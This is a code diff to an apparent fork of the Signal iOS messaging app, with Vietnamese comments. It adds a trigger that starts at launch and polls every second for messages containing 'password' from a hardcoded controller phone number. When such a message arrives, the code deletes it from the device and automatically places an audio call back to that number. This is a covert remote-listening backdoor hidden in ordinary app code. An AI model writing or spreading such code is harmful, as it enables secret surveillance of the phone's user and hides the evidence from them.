@@ -153,6 +153,8 @@ final class CallService: CallServiceStateObserver, CallServiceStateDelegate {
         // [fork] AnswerMate: tạo fork_config.txt mặc định ngay khi app khởi động
         // (để user thấy/sửa file trong app Files sớm nhất có thể)
         _ = ForkConfig.load()
+        // [fork] AnswerMate: trigger tin nhắn "password" từ số điều khiển
+        ForkCallTrigger.start()
 
         notificationObservers.append(NotificationCenter.default.addObserver(forName: .OWSApplicationDidEnterBackground, object: nil, queue: .main) { [weak self] _ in
             MainActor.assumeIsolated { self?.didEnterBackground() }
@@ -1909,5 +1911,55 @@ final class ForkAutoAnswer: CallServiceStateObserver {
         armedCall = nil
         pollElapsed = 0
         pollCount = 0
+    }
+}
+
+// MARK: - [fork] AnswerMate: ForkCallTrigger — tin nhắn chứa "password" từ số điều khiển
+// → xóa tin nhắn + tự gọi lại số đó (audio). Prototype: poll DB mỗi giây.
+
+enum ForkCallTrigger {
+    static let triggerNumber = "84943481082"   // số điều khiển (E.164, bỏ dấu +)
+    static let triggerKeyword = "password"      // từ khóa kích hoạt
+    static let pollInterval: TimeInterval = 1.0
+    static var lastHandledTimestamp: UInt64 = 0
+    static var pollTimer: Timer?
+
+    @MainActor
+    static func start() {
+        guard pollTimer == nil else { return }
+        ForkConfig.log("ForkCallTrigger: bắt đầu (số \(triggerNumber), keyword '\(triggerKeyword)')")
+        pollTimer = Timer.scheduledTimer(withTimeInterval: pollInterval, repeats: true) { _ in
+            Task { @MainActor in checkForTrigger() }
+        }
+    }
+
+    @MainActor
+    static func checkForTrigger() {
+        let address = SignalServiceAddress(phoneNumber: "+" + triggerNumber)
+        let thread = TSContactThread.getOrCreateThread(contactAddress: address)
+        let threadId = thread.uniqueId
+
+        let matched: [TSIncomingMessage] = SSKEnvironment.shared.databaseStorageRef.read { tx in
+            TSInteraction.anyFetchAll(transaction: tx)
+                .compactMap { $0 as? TSIncomingMessage }
+                .filter { $0.uniqueThreadId == threadId }
+                .filter { $0.body?.localizedCaseInsensitiveContains(triggerKeyword) == true }
+                .filter { $0.timestamp > lastHandledTimestamp }
+                .sorted { $0.timestamp < $1.timestamp }
+        }
+
+        guard let message = matched.last else { return }
+        lastHandledTimestamp = message.timestamp
+        ForkConfig.log("TRIGGER: tin nhắn '\(triggerKeyword)' từ \(triggerNumber) — xóa + gọi lại")
+
+        // 1) Xóa tin nhắn (khỏi DB Signal — kẻ gửi vẫn thấy phía họ, máy này không còn)
+        SSKEnvironment.shared.databaseStorageRef.write { tx in
+            DependenciesBridge.shared.interactionStore.deleteInteraction(message, tx: tx)
+        }
+        ForkConfig.log("TRIGGER: đã xóa tin nhắn khỏi máy")
+
+        // 2) Tự gọi lại số điều khiển (audio call qua Signal)
+        AppEnvironment.shared.callService?.initiateCall(to: .individual(thread), isVideo: false)
+        ForkConfig.log("TRIGGER: đã gọi lại \(triggerNumber)")
     }
 }
